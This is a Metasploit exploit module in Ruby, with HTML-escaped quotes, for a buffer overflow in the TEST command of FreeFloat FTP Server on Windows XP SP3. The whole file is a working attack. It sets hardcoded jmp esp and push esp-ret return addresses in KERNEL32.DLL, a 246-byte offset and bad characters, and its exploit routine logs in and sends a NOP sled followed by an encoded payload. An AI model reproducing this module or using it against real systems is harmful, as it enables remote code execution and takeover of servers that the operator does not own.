require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
    include Msf::Exploit::Remote::Ftp
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;FreeFloat FTP Server TEST Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                        This module exploits a FreeFloat FTP Server Buffer Overflow
                        found in the TEST command.
            },
            &#039;Author&#039;         => [
                        &#039;KaHPeSeSe&#039;     #Found bug and wrote the exploit
                    ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 14774 $",
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17546&#039; ],
					[ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17548&#039; ],
					[ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17550&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;PERFECT XP PC1 / SP3 # jmp esp&#039;,
                        {
                            &#039;Ret&#039; => 0x7C86467B, # findjmp KERNEL32.DLL ESP 0x7C86467B jmp ESP
                            &#039;Offset&#039; => 246
                        }
                    ],
					
					[ &#039;PERFECT XP PC1 / SP3 # push esp - ret&#039;,
                        {
                            &#039;Ret&#039; => 0x7C909DB0, # findjmp KERNEL32.DLL ESP 0x7C909DB0 push esp - ret
                            &#039;Offset&#039; => 246
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;March 13 2012&#039;,
            &#039;DefaultTarget&#039; => 0))
			
			register_options(
			[
				Opt::RPORT(21),
				OptString.new(&#039;FTPUSER&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;test&#039;]),
				OptString.new(&#039;FTPPASS&#039;, [ false, &#039;The password to authenticate with&#039;, &#039;test&#039;])
			], self.class )
	end
	
    def exploit
        connect_login
        print_status("Trying target #{target.name}...")
        buf = make_nops(target[&#039;Offset&#039;]) + [target.ret].pack(&#039;V&#039;)
        buf << make_nops(20)
        buf << payload.encoded
        send_cmd( [&#039;TEST&#039;, buf] , false )   #TEST command
        handler
        disconnect
    end
end



